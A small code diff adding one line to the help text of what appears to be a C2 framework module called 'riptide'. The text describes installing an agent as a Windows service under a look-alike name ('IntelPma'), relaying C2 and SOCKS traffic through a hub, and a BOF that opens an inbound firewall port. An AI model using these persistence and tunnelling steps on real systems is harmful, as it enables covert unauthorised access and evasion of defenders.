@@ -72,6 +72,7 @@ def riptide_help(demonID, *param):
         "riptide-hub     <src.exe> [hub.conf]  [svc_name]\n"
         "  copies to %ProgramFiles%\\Riptide\\ and CreateService delayed-auto\n"
         "  hub conf = ListenPort UDP (cryptokey relay + C2 proxy + SOCKS)\n"
+        "  BOF opens Windows firewall inbound UDP ListenPort\n"
         "  example spoke: riptide-install C:\\Users\\Public\\riptide-agent.exe "
         "C:\\Users\\Public\\peer.conf IntelPma\n"
         "  example hub:   riptide-hub C:\\Users\\Public\\riptide-agent.exe "
